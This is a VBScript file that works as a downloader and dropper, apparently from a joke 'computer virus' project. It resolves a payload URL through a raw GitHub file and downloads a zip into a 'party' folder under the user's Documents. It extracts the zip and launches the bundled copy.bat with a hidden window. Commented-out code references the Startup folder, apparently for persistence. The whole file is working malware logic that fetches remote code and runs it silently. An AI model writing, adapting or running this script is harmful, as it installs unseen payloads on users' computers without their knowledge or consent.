'Const CSIDL_COMMON_DOCUMENTS = &h2e
'  Dim objShell : Set objShell = CreateObject("Shell.Application")
'  docFold = objShell.Namespace(CSIDL_COMMON_DOCUMENTS).Self.Path
strUser = CreateObject("WScript.Network").UserName
docFold = "C:\Users\" & strUser & "\Documents\party\"

Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(docFold) Then
	fso.CreateFolder docFold
End If


Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "https://raw.githubusercontent.com/stranck/WeAreNumberOneButItIsAComputerVirus/master/online/dwn", false
    objXMLHTTP.send()

dwnn = objXMLHTTP.responseText

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", dwnn, False
xHttp.Send 'http://download944.mediafire.com/0yv4p03rjhcg/pbhsqz8mtn0n305/test.zip

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile docFold & "zip.zip", 2 '//overwrite
end with


'The location of the zip file.
ZipFile=docFold & "zip.zip"
'The folder the contents should be extracted to.
ExtractTo=docFold

'If the extraction location does not exist create it.
Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(ExtractTo) Then
   fso.CreateFolder(ExtractTo)
End If

'Extract the contants of the zip file.
set objShell = CreateObject("Shell.Application")
set FilesInZip=objShell.NameSpace(ZipFile).items
objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)
Set fso = Nothing
Set objShell = Nothing

'Const ssfSTARTUP = &H7

'Set oShell = CreateObject("Shell.Application")
'Set startupFolder = oShell.NameSpace(ssfSTARTUP)
'spF = startupFolder.Self.Path

'If Not startupFolder Is Nothing Then
'  WScript.Echo startupFolder.Self.Path
'End If

Set WshShell = WScript.CreateObject ("WScript.Shell")
WshShell.Run chr(34) & docFold & "copy.bat" & Chr(34), 0, false
Set WshShell = Nothing'